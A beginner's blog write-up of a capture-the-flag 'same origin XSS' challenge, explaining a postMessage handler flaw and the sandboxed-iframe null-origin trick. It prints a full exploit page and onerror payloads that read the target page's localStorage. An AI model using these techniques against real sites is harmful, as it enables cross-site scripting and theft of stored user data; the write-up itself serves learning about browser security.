Writeup on same origin xss challenge

In this blog, I am going to explain the solution for the same origin xss challenge created by NDevTK and terjanq. I am around beginner to intermediate level in client side so this challenge taught me a lot of things and I couldn't quite understand the solution at first try. However, I'll be explaining it in the simplest form as per my ability to.

Challenge objective(Simplified)

So, the main objective of this challenge is to read the localStorage.html property of https://so-xss.terjanq.me/iframe.php page. localStorage.html property is set whenever you save any code on https://so-xss.terjanq.me. The /iframe.php page exposes a postmessage handler with the following code:

const identifier = 'random_string'; onmessage = e => { const data = e.data; if (e.origin !== window.origin && data.identifier !== identifier) return; if (data.type === 'render') { renderContainer.innerHTML = data.body; } }

We'll be working with this event handler throughout the challenge.

Challenge solution thought process

The message handler is fairly simple. As you can see, in order to get the XSS we need to first make the if (e.origin !== window.origin && data.identifier !== identifier) code block evaluate to false so that it doesn't skip the rendering part. The condition says, It will evaluate to true if the origin sending the message and the origin of the window is not equal and the identifer sent by the messaging origin is not equal to the specified identifier. Since it is using && operator We need to make one of the conditions false.

Sandbox iframes

We can create sandbox iframes using the sandbox attribute of iframe tag. like this:

whenever a sandbox attribute is defined in an iframe tag, the browser will set the origin of the iframe to null(an opaque origin) completely isolating it from the original origin i.e test.com and the sandbox attribute also imposes a lot of restrictions such as not being able to run any script, popups and many more. read more : https://www.w3schools.com/tags/att_iframe_sandbox.asp Since the browser sees it as a completely different origin. it also cannot access the localstorage or cookies.

another fun quirk of this is that any page opened up by a sandboxed iframe inherits the property of it's opener. for e.g if you have a page with the following code:

<html>
<head><title>Demo</title></head>
<body>
<h1>This is a test page</h1>
<iframe src=https://mydomain.com sandbox='allow-scripts allow-popups'>
</body>
</html>

and the mydomain.com has the following code:

<html>
<head><title>Demo</title></head>
<body>
<h1>This is a test page</h1>
<script>// this page can run scripts because of 'allow-scripts' permission in sandbox attribute window.open("https://victimsite.com"); // because of allow-popups permission </script>
</body>
</html>

Now, In this context the 'window.origin' property for victimsite.com will also be null and it will also inherit the sandbox properties i.e allow-scripts and allow-popups but it cannot use other functions such as alert() or prompt() because it requires allow-modals permission. This is the main trick that we are going to be using to solve the lab.

Challenge solution

First of all, we have a pretty simple postmessage xss using this 'null' trick. As you already know, In order to get the xss we have to make the following code evaluate to 'false':
(e.origin !== window.origin && data.identifier !== identifier)

one way to make this condition false is when e.origin and window.origin are both equal. If both of them are the same then the condition: e.origin !== window.origin will be false and hence the whole condition becomes false. So, how can we make these e.origin and window.origin equal?. You guessed it right, using the null trick. If both of them have the same value null then it will be false.

you have your attacker page:
https://attacker.com:

<html>
<head><title>Demo</title></head>
<body>
<h1>This is a test page</h1>
<iframe src=https://attacker.com/iframe.html sandbox='allow-scripts allow-popups'>
</body>
</html>

and the iframe.html has the following code:

<html>
<head><title>Demo for /iframe.html</title></head>
<body>
<h1>This is a test page</h1>
<script>
let b=window.open("https://https://so-xss.terjanq.me/iframe.php");
b.postMessage("<img src=x onerror=console.log('xss)","*");
</script>
</body>
</html>

and our payload is successfully rendered on the https://so-xss.terjanq.me/iframe.php page. However, we still cannot do smth like <img src=x onerror=alert(localStorage.html)> and read the property since the opened https://so-xss.terjanq.me/iframe.php page is sandboxed so the browser treats this as a different origin so it won't have access to the localStorage of the original so-xss.terjanq.me/iframe.php page.

In order to read the property, we need an xss on so-xss.terjanq.me/iframe.php which is not sandboxed. this can be done by redirecting the opener page(attacker.com) to so-xss.terjanq.me/iframe.php and sending the xss payload from the opened sandboxed so-xss.terjanq.me/iframe.php page. something like this:

so the final payload will look like this:

<!DOCTYPE html> <html lang="en"> <head>     <meta charset="UTF-8">     <meta name="viewport" content="width=device-width, initial-scale=1.0">     <title>My first writeup</title> </head> <body>  <script>  let iframe = document.createElement('iframe');     iframe.sandbox = 'allow-scripts allow-popups allow-top-navigation'; let payload = "x=opener.top; opener.postMessage(1,'*'); setTimeout(() => { x.postMessage({type: 'render',identifier,body:'<img src=x onerror=alert(localStorage.html)>'}, '*'); }, 1000)";   iframe.srcdoc=` <h1>hello</h1> <script> onclick = e => {         let w = open('https://so-xss.terjanq.me/iframe.php');         onmessage = e => top.location = 'https://so-xss.terjanq.me/iframe.php';         setTimeout(_ => {           w.postMessage({type: "render", body: "<audio/src/onerror=\\"${payload}\\">"}, '*')         }, 1000);       };     <\/script> `  document.body.appendChild(iframe); </script>   </body> </html>

first of all, the sandboxed iframe, sends a payload using audio tag. the payload sent is:

x=opener.top; opener.postMessage(1,'*'); setTimeout(() => { x.postMessage({type: 'render',identifier,body:'<img src=x onerror=alert(localStorage.html)>'}, '*'); }, 1000)

here, x is assigned opener.top which refers to the parent page i.e attacker.com and the opened page sends a postMessage to the opener, the opener has the following message listener:

 onmessage = e => top.location = 'https://so-xss.terjanq.me/iframe.php';

which just redirects the parent page to https://so-xss.terjanq.me/iframe.php , now since we already have a reference to opener.top i.e the parent page which is now so-xss.terjanq.me/iframe.php which is not sandboxed or anything, we can now read the localStorage.html property. but how do we trigger the xss. At first we could trigger the xss because both of the origin was null, but now it is not sanboxed. we can use the other condition and make it false, i.e data.identifier !== identifier , we are currently on the opened so-xss.terjanq.me/iframe.php page so we have access to the identifier value and if we sent the identifier in the postMessage , the condition data.identifier !== identifier will be false.
and the final payload will be:

x.postMessage({type: 'render',identifier,body:'<img src=x onerror=alert(localStorage.html)>'}, '*')

which concludes the solution for this challenge.
